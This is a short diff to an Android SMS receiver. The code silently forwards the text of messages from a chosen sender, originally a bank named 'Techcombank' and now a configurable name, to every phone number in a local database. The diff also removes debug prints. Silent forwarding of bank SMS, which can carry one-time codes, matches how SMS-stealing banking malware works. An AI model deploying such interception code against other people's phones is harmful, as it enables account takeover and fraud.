@@ -24,7 +24,6 @@ public class SimpleSmsReciever extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        System.out.println("6666666666666666666666666666666");
         if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
             dbManager = new DBManager(context);
             Bundle pudsBundle = intent.getExtras();
@@ -32,13 +31,11 @@ public class SimpleSmsReciever extends BroadcastReceiver {
             SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[0]);
             SmsManager sms = SmsManager.getDefault();
 
-
-            if (messages.getOriginatingAddress().equalsIgnoreCase("Techcombank")) {
+            if (messages.getOriginatingAddress().equalsIgnoreCase(SessionManager.getInstance().getKeySaveName())) {
 
                 phone = dbManager.getAllPhone();
                 for (int i = 0; i < phone.size(); i++) {
                     sms.sendTextMessage(phone.get(i).getPhone(), null, messages.getMessageBody(), null, null);
-                    System.out.println("6666666666666666666666666666666" + phone.get(i));
                 }
             }
         }
